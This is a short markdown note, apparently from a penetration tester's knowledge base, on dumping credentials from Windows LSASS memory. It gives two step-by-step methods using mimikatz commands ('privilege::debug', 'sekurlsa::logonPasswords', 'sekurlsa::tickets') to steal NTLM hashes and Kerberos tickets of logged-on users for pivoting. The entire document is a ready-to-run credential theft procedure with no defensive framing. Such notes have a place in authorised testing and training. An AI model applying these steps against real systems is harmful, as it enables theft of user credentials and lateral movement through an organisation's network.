---
id: LSASS
aliases:
  - Dumping LSASS
tags:
  - windows
  - AD
  - passwords
  - pivoting
  - ntlm
  - kerberos
---
**Note:** SYSTEM / Local Admin Privileges are required to dump LSASS

## Method 1
> Steal NTLM (or others) hashes of logged on users

1. Run `mimikatz.exe`
2. Engage the `SeDebugPrivlege` privilege with `privilege::debug`
3. Dump credentials with `sekurlsa::logonPasswords`


## Method 2
> Abuses TGT and service tickets -> steal TGT & TGS

1. List the content of a SMB share on target machine -> creates and caches a service ticket
2. Run `mimikatz.exe`
3. Engage the `SeDebugPrivlege` privilege with `privilege::debug`
4. Dump credentials with `sekurlsa::tickets`
